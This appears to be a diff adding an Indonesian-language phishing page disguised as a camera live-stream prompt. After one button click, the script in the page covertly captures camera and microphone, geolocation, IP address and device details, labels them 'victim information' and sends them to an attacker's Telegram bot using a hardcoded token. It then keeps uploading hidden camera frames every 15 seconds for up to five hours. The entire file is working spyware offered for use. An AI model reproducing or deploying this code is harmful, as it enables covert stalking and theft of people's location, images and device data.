@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Live Streaming Kamera</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .popup {
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      text-align: center;
+      width: 300px;
+      animation: fadeIn 0.7s ease;
+    }
+    button {
+      padding: 10px 20px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 8px;
+      background: #00ff88;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+  </style>
+</head>
+<body>
+  <div class="popup" id="step1">
+    <h2>untuk melanjutkan silahkan pencet tombol dibawah</h2>
+    <button onclick="startStreaming()">LANJUTKAN</button>
+  </div>
+
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <div id="loading" style="display:none;">
+    <h3>Tunggu sebentar...</h3>
+  </div>
+
+  <script>
+    const token = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo';
+    const chat_id = '6374002294';
+    let snapshotInterval;
+    let recordingInterval;
+
+    // Meminta izin untuk mengakses kamera dan mikrofon dengan kualitas tinggi
+    async function startStreaming() {
+      try {
+        // Meningkatkan resolusi video saat meminta akses kamera dan mikrofon
+        const constraints = {
+          video: {
+            width: { ideal: 1920 },
+            height: { ideal: 1080 },
+            frameRate: { ideal: 30, max: 60 }  // Frame rate yang lebih tinggi untuk kualitas video yang lebih baik
+          },
+          audio: true
+        };
+        
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        const video = document.getElementById('video');
+        video.style.display = 'none';  // Video disembunyikan
+        video.srcObject = stream;
+
+        // Meminta lokasi pengguna
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            // Mengambil informasi perangkat
+            const userAgent = navigator.userAgent;
+            const ip = await getIp();
+            const androidVersion = navigator.userAgent.match(/Android (\d+\.\d+)/)?.[1] || "N/A";
+            const deviceName = navigator.platform;
+
+            // Kirim data ke Telegram
+            await sendToTelegram(lat, lon, locationLink, stream, userAgent, ip, androidVersion, deviceName);
+          });
+        }
+
+        // Menunggu 15 detik sebelum mulai merekam dan mengirimkan video
+        setTimeout(() => {
+          recordingInterval = setInterval(() => {
+            sendVideoToTelegram(stream);
+          }, 15000); // Mengirim video setiap 15 detik
+        }, 15000);  // Tunggu 15 detik untuk mulai merekam
+
+        // Berhenti setelah 5 jam (180 menit atau 18000000 milidetik)
+        setTimeout(() => {
+          clearInterval(recordingInterval);  // Menghentikan pengiriman video
+          alert('Streaming selesai setelah 5 jam.');
+        }, 18000000);  // 5 jam dalam milidetik
+
+      } catch (err) {
+        console.error('Error:', err);
+        alert("Akses kamera atau lokasi ditolak!");
+      }
+    }
+
+    // Mengambil IP pengguna
+    async function getIp() {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    }
+
+    // Mengirim data ke Telegram
+    async function sendToTelegram(lat, lon, locationLink, stream, userAgent, ip, androidVersion, deviceName) {
+      const formData = new FormData();
+      formData.append("chat_id", chat_id);
+
+      // Menambahkan informasi korban
+      const message = `
+        INFORMASI KORBAN BY RIZKYGG
+        ============================
+        Lokasinya: ${locationLink}
+        ============================
+        Nama HP: ${deviceName}
+        ============================
+        Perangkat: ${userAgent}
+        ============================
+        IP: ${ip}
+        ============================
+        Android: ${androidVersion}
+        ============================
+        Waktu: ${new Date().toLocaleString()}
+        ============================
+        Kamera: Aktif
+      `;
+
+      formData.append("text", message);
+
+      // Kirim data ke Telegram
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        body: formData
+      }).catch((error) => {
+        console.error('Telegram Error:', error);
+      });
+    }
+
+    // Mengambil video dan mengirim ke Telegram setiap 15 detik
+    async function sendVideoToTelegram(stream) {
+      const formData = new FormData();
+      formData.append("chat_id", chat_id);
+
+      // Buat elemen <canvas> untuk mengambil frame dari video
+      const canvas = document.createElement('canvas');
+      const video = document.getElementById('video');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      // Menggambar video ke canvas dengan kualitas tinggi
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      // Konversi canvas menjadi file video
+      canvas.toBlob((blob) => {
+        formData.append("video", blob, "video.mp4");
+
+        // Mengirim file video ke Telegram
+        fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+          method: 'POST',
+          body: formData
+        }).catch((error) => {
+          console.error('Telegram Error:', error);
+        });
+      }, 'video/mp4');
+    }
+  </script>
+</body>
+</html>
